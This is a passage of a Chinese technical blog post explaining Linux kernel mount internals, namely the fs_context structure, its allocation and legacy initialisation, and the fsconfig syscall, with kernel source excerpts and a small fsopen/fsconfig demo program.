class="class"><span class="keyword">struct</span> <span class="title">file_system_type</span>*<span class="title">fs_type</span>;</span></span><br><span class="line"><span class="keyword">void</span>*fs_private;<span class="comment">/* The filesystem&#x27;s context */</span></span><br><span class="line"><span class="keyword">void</span>*sget_key;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dentry</span>*<span class="title">root</span>;</span><span class="comment">/* The root and superblock */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span>*<span class="title">user_ns</span>;</span><span class="comment">/* The user namespace for this mount */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">net</span>*<span class="title">net_ns</span>;</span><span class="comment">/* The network namespace for this mount */</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span>*<span class="title">cred</span>;</span><span class="comment">/* The mounter&#x27;s credentials */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fc_log</span>*<span class="title">log</span>;</span><span class="comment">/* Logging buffer */</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>*source;<span class="comment">/* The source name (eg. dev path) */</span></span><br><span class="line"><span class="keyword">void</span>*security;<span class="comment">/* Linux S&amp;M options */</span></span><br><span class="line"><span class="keyword">void</span>*s_fs_info;<span class="comment">/* Proposed s_fs_info */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span>sb_flags;<span class="comment">/* Proposed superblock flags (SB_*) */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span>sb_flags_mask;<span class="comment">/* Superblock flags that were changed */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span>s_iflags;<span class="comment">/* OR&#x27;d with sb-&gt;s_iflags */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span>lsm_flags;<span class="comment">/* Information flags from the fs to the LSM */</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">fs_context_purpose</span><span class="title">purpose</span>:</span><span class="number">8</span>;</span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">fs_context_phase</span><span class="title">phase</span>:</span><span class="number">8</span>;<span class="comment">/* The phase the context is in */</span></span><br><span class="line"><span class="keyword">bool</span>need_free:<span class="number">1</span>;<span class="comment">/* Need to call ops-&gt;free() */</span></span><br><span class="line"><span class="keyword">bool</span>global:<span class="number">1</span>;<span class="comment">/* Goes into &amp;init_user_ns */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>上面是<code>fs_context</code>结构体的定义，前面提到其是通过<code>fs_context_for_mount</code>函数申请的，这个函数内部是直接调用了<code>alloc_fs_context</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * alloc_fs_context - Create a filesystem context.</span></span><br><span class="line"><span class="comment"> * @fs_type: The filesystem type.</span></span><br><span class="line"><span class="comment"> * @reference: The dentry from which this one derives (or NULL)</span></span><br><span class="line"><span class="comment"> * @sb_flags: Filesystem/superblock flags (SB_*)</span></span><br><span class="line"><span class="comment"> * @sb_flags_mask: Applicable members of @sb_flags</span></span><br><span class="line"><span class="comment"> * @purpose: The purpose that this configuration shall be used for.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Open a filesystem and create a mount context.  The mount context is</span></span><br><span class="line"><span class="comment"> * initialised with the supplied flags and, if a submount/automount from</span></span><br><span class="line"><span class="comment"> * another superblock (referred to by @reference) is supplied, may have</span></span><br><span class="line"><span class="comment"> * parameters such as namespaces copied across from that superblock.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> struct fs_context *<span class="title">alloc_fs_context</span><span class="params">(struct file_system_type *fs_type,</span></span></span><br><span class="line"><span class="params"><span class="function">      struct dentry *reference,</span></span></span><br><span class="line"><span class="params"><span class="function">      <span class="keyword">unsigned</span> <span class="keyword">int</span> sb_flags,</span></span></span><br><span class="line"><span class="params"><span class="function">      <span class="keyword">unsigned</span> <span class="keyword">int</span> sb_flags_mask,</span></span></span><br><span class="line"><span class="params"><span class="function">      <span class="keyword">enum</span> fs_context_purpose purpose)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> (*init_fs_context)(struct fs_context *);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fs_context</span> *<span class="title">fc</span>;</span></span><br><span class="line"><span class="keyword">int</span> ret = -ENOMEM;</span><br><span class="line"></span><br><span class="line">fc = kzalloc(<span class="keyword">sizeof</span>(struct fs_context), GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (!fc)</span><br><span class="line"><span class="keyword">return</span> ERR_PTR(-ENOMEM);</span><br><span class="line"></span><br><span class="line">fc-&gt;purpose= purpose;</span><br><span class="line">fc-&gt;sb_flags= sb_flags;</span><br><span class="line">fc-&gt;sb_flags_mask = sb_flags_mask;</span><br><span class="line">fc-&gt;fs_type= get_filesystem(fs_type);</span><br><span class="line">fc-&gt;cred= get_current_cred();</span><br><span class="line">fc-&gt;net_ns= get_net(current-&gt;nsproxy-&gt;net_ns);</span><br><span class="line"></span><br><span class="line">mutex_init(&amp;fc-&gt;uapi_mutex);</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (purpose) &#123;</span><br><span class="line"><span class="keyword">case</span> FS_CONTEXT_FOR_MOUNT:</span><br><span class="line">fc-&gt;user_ns = get_user_ns(fc-&gt;cred-&gt;user_ns);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> FS_CONTEXT_FOR_SUBMOUNT:</span><br><span class="line">fc-&gt;user_ns = get_user_ns(reference-&gt;d_sb-&gt;s_user_ns);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> FS_CONTEXT_FOR_RECONFIGURE:</span><br><span class="line">atomic_inc(&amp;reference-&gt;d_sb-&gt;s_active);</span><br><span class="line">fc-&gt;user_ns = get_user_ns(reference-&gt;d_sb-&gt;s_user_ns);</span><br><span class="line">fc-&gt;root = dget(reference);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* <span class="doctag">TODO:</span> Make all filesystems support this unconditionally */</span></span><br><span class="line">init_fs_context = fc-&gt;fs_type-&gt;init_fs_context;</span><br><span class="line"><span class="keyword">if</span> (!init_fs_context)</span><br><span class="line">init_fs_context = legacy_init_fs_context;</span><br><span class="line"></span><br><span class="line">ret = init_fs_context(fc);</span><br><span class="line"><span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> err_fc;</span><br><span class="line">fc-&gt;need_free = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">return</span> fc;</span><br><span class="line"></span><br><span class="line">err_fc:</span><br><span class="line">put_fs_context(fc);</span><br><span class="line"><span class="keyword">return</span> ERR_PTR(ret);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先这里通过<code>kzalloc</code>函数分配一个堆块给到了<code>fs_context</code>结构体，后续设置其对应的属性，接着设置其命名空间，最后则是进行初始化。</p><p>在完成了前面的操作之后，最终进行具体文件系统对应初始化工作的其实是调用 <code>file_system_type</code> 中的 <code>init_fs_context</code> 函数指针对应的函数完成的，这里我们可以看到对于未设置 <code>init_fs_context</code> 的文件系统类型而言其最终会调用 <code>legacy_init_fs_context()</code> 进行初始化</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">legacy_init_fs_context</span><span class="params">(struct fs_context *fc)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">fc-&gt;fs_private = kzalloc(<span class="keyword">sizeof</span>(struct legacy_fs_context), GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (!fc-&gt;fs_private)</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line">fc-&gt;ops = &amp;legacy_fs_context_ops;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的主要操作是给<code>fs_context-&gt;fs_private</code>分配<code>legacy_fs_context</code>结构体，并赋值其ops为<code>legacy_fs_context_ops</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">legacy_fs_context</span> &#123;</span></span><br><span class="line"><span class="keyword">char</span>*legacy_data;<span class="comment">/* Data page for legacy filesystems */</span></span><br><span class="line"><span class="keyword">size_t</span>data_size;</span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">legacy_fs_param</span><span class="title">param_type</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>结构体定义如上，标识了一块指定长度与类型的缓冲区。</p><h3 id="fsconfig"><a href="#fsconfig" class="headerlink" title="fsconfig"></a>fsconfig</h3><p>在完成了空白的文件系统上下文的创建之后，我们还需要对其进行相应的配置，以便于后续的挂载操作，这个配置的功能对应到的就是 <code>fsconfig()</code> 系统调用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/mount.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __NR_fsopen</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fsopen 430</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __NR_fsconfig</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fsconfig 431</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fsopen</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *fs_name, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_fsopen, fs_name, flags);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fsconfig</span><span class="params">(<span class="keyword">int</span> fsfd, <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">const</span> <span class="keyword">char</span> *key, <span class="keyword">const</span> <span class="keyword">void</span> *val, <span class="keyword">int</span> aux)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_fsconfig, fsfd, cmd, key, val, aux);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fs_fd;</span><br><span class="line">    </span><br><span class="line">    fs_fd = fsopen(<span class="string">&quot;ext4&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (fs_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[x] FAILED to fsopen!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Successfully get an ext4 filesystem context descriptor:%d\n&quot;</span>, fs_fd);</span><br><span class="line"></span><br><span class="line">    fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="string">&quot;source&quot;</span>, <span class="string">&quot;/dev/sdb1&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    fsconfig(fs_fd, FSCONFIG_CMD_CREATE, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>fsconfig()</code> 系统调用根据不同的 cmd 进行不同的操作，对于挂载文件系统而言其核心操作主要就是两个 cmd：</p><ul><li><code>FSCONFIG_SET_STRING</code> ：设置不同的键值对参数</li><li><code>FSCONFIG_CMD_CREATE</code>：获得一个 superblock 并创建一个 root entry</li></ul><p>示例用法如上所示，这里创建了一个键值对 <code>&quot;source&quot;=/dev/sdb1</code> 表示文件系统源所在的设备名</p><p>在内核中也是<code>fsconfig</code>的实现也是比较长，主要根据不同的cmd进入到不同的swith分支</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE5(fsconfig,</span><br><span class="line"><span class="keyword">int</span>, fd,</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span>, cmd,</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> __user *, _key,</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">void</span> __user *, _value,</span><br><span class="line"><span class="keyword">int</span>, aux)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fs_context</span> *<span class="title">fc</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fd</span> <span class="title">f</span>;</span></span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fs_parameter</span> <span class="title">param</span> =</span> &#123;</span><br><span class="line">.type= fs_value_is_undefined,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line"><span class="keyword">case</span> FSCONFIG_SET_FLAG:</span><br><span class="line"><span class="keyword">if</span> (!_key || _value || aux)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> FSCONFIG_SET_STRING:</span><br><span class="line"><span class="keyword">if</span> (!_key || !_value || aux)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> FSCONFIG_SET_BINARY:</span><br><span class="line"><span class="keyword">if</span> (!_key || !_value || aux &lt;= <span class="number">0</span> || aux &gt; <span class="number">1024</span> * <span class="number">1024</span>)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> FSCONFIG_SET_PATH:</span><br><span class="line"><span class="keyword">case</span> FSCONFIG_SET_PATH_EMPTY:</span><br><span class="line"><span class="keyword">if</span> (!_key || !_value || (aux != AT_FDCWD &amp;&amp; aux &lt; <span class="number">0</span>))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> FSCONFIG_SET_FD:</span><br><span class="line"><span class="keyword">if</span> (!_key || _value || aux &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> FSCONFIG_CMD_CREATE:</span><br><span class="line"><span class="keyword">case</span> FSCONFIG_CMD_RECONFIGURE:</span><br><span class="line"><span class="keyword">if</span> (_key || _value || aux)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">return</span> -EOPNOTSUPP;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f = fdget(fd);</span><br><span class="line"><span class="keyword">if</span> (!f.file)</span><br><span class="line"><span class="keyword">return</span> -EBADF;</span><br><span class="line">ret = -EINVAL;</span><br><span class="line"><span class="keyword">if</span> (f.file-&gt;f_op != &amp;fscontext_fops)</span><br><span class="line"><span class="keyword">goto</span> out_f;</span><br><span class="line"></span><br><span class="line">fc = f.file-&gt;private_data;</span><br><span class="line"><span class="keyword">if</span> (fc-&gt;ops == &amp;legacy_fs_context_ops) &#123;</span><br><span class="line"><span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line"><span class="keyword">case</span> FSCONFIG_SET_BINARY:</span><br><span class="line"><span class="keyword">case</span> FSCONFIG_SET_PATH:</span><br><span class="line"><span class="keyword">case</span> FSCONFIG_SET_PATH_EMPTY:</span><br><span class="line"><span class="keyword">case</span> FSCONFIG_SET_FD:</span><br><span class="line">ret = -EOPNOTSUPP;</span><br><span class="line"><span class="keyword">goto</span> out_f;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (_key) &#123;</span><br><span class="line">param.key = strndup_user(_key, <span class="number">256</span>);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(param.key)) &#123;</span><br><span class="line">ret = PTR_ERR(param.key);</span><br><span class="line"><span class="keyword">goto</span> out_f;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line"><span class="keyword">case</span> FSCONFIG_SET_FLAG:</span><br><span class="line">param.type = fs_value_is_flag;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> FSCONFIG_SET_STRING:</span><br><span class="line">param.type = fs_value_is_string;</span><br><span class="line">param.<span class="built_in">string</span> = strndup_user(_value, <span class="number">256</span>);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(param.<span class="built_in">string</span>)) &#123;</span><br><span class="line">ret = PTR_ERR(param.<span class="built_in">string</span>);</span><br><span class="line"><span class="keyword">goto</span> out_key;</span><br><span class="line">&#125;</span><br><span class="line">param.size = <span class="built_in">strlen</span>(param.<span class="built_in">string</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> FSCONFIG_SET_BINARY:</span><br><span class="line">param.type = fs_value_is_blob;</span><br><span class="line">param.size = aux;</span><br><span class="line">param.blob = memdup_user_nul(_value, aux);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(param.blob)) &#123;</span><br><span class="line">ret = PTR_ERR(param.blob);</span><br><span class="line"><span class="keyword">goto</span> out_key;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> FSCONFIG_SET_PATH:</span><br><span class="line">param.type = fs_value_is_filename;</span><br><span class="line">param.name = getname_flags(_value, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(param.name)) &#123;</span><br><span class="line">ret = PTR_ERR(param.name);</span><br><span class="line"><span class="keyword">goto</span> out_key;</span><br><span class="line">&#125;</span><br><span class="line">param.dirfd = aux;</span><br><span class="line">param.size = <span class="built_in">strlen</span>(param.name-&gt;name);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> FSCONFIG_SET_PATH_EMPTY:</span><br><span class="line">param.type = fs_value_is_filename_empty;</span><br><span class="line">param.name = getname_flags(_value, LOOKUP_EMPTY, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(param.name)) &#123;</span><br><span class="line">ret = PTR_ERR(param.name);</span><br><span class="line"><span class="keyword">goto</span> out_key;</span><br><span class="line">&#125;</span><br><span class="line">param.dirfd = aux;</span><br><span class="line">param.size = <span class="built_in">strlen</span>(param.name-&gt;name);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> FSCONFIG_SET_FD:</span><br><span class="line">param.type = fs_value_is_file;</span><br><span class="line">ret = -EBADF;</span><br><span class="line">param.file = fget(aux);</span><br><span class="line"><span class="keyword">if</span> (!param.file)</span><br><span class="line"><span class="keyword">goto</span> out_key;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ret = mutex_lock_interruptible(&amp;fc-&gt;uapi_mutex);</span><br><span class="line"><span class="keyword">if</span> (ret == <span class="number">0</span>) &#123;</span><br><span class="line">ret = vfs_fsconfig_locked(fc, cmd, &amp;param);</span><br><span class="line">mutex_unlock(&amp;fc-&gt;uapi_mutex);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Clean up the our record of any value that we obtained from</span></span><br><span class="line"><span class="comment"> * userspace.  Note that the value may have been stolen by the LSM or</span></span><br><span class="line"><span class="comment"> * filesystem, in which case the value pointer will have been cleared.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line"><span class="keyword">case</span> FSCONFIG_SET_STRING:</span><br><span class="line"><span class="keyword">case</span> FSCONFIG_SET_BINARY:</span><br><span class="line">kfree(param.<span class="built_in">string</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> FSCONFIG_SET_PATH:</span><br><span class="line"><span class="keyword">case</span> FSCONFIG_SET_PATH_EMPTY:</span><br><span class="line"><span class="keyword">if</span> (param.name)</span><br><span class="line">putname(param.name);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> FSCONFIG_SET_FD:</span><br><span class="line"><span class="keyword">if</span> (param.file)</span><br><span class="line">fput(param.file);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">out_key:</span><br><span class="line">kfree(param.key);</span><br><span class="line">out_f:</span><br><span class="line">fdput(f);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在前面主要操作是对参数进行各种检测，紧接着获取到文件描述符，接着获取<code>fs_config</code>，随后拷贝key字段到内核中，最终根据不同的cmd进入switch</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> FSCONFIG_SET_STRING:</span><br><span class="line">param.type = fs_value_is_string;</span><br><span class="line">param.<span class="built_in">string</span> = strndup_user(_value, <span class="number">256</span>);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(param.<span class="built_in">string</span>)) &#123;</span><br><span class="line">ret = PTR_ERR(param.<span class="built_in">string</span>);</span><br><span class="line"><span class="keyword">goto</span> out_key;</span><br><span class="line">&#125;</span><br><span 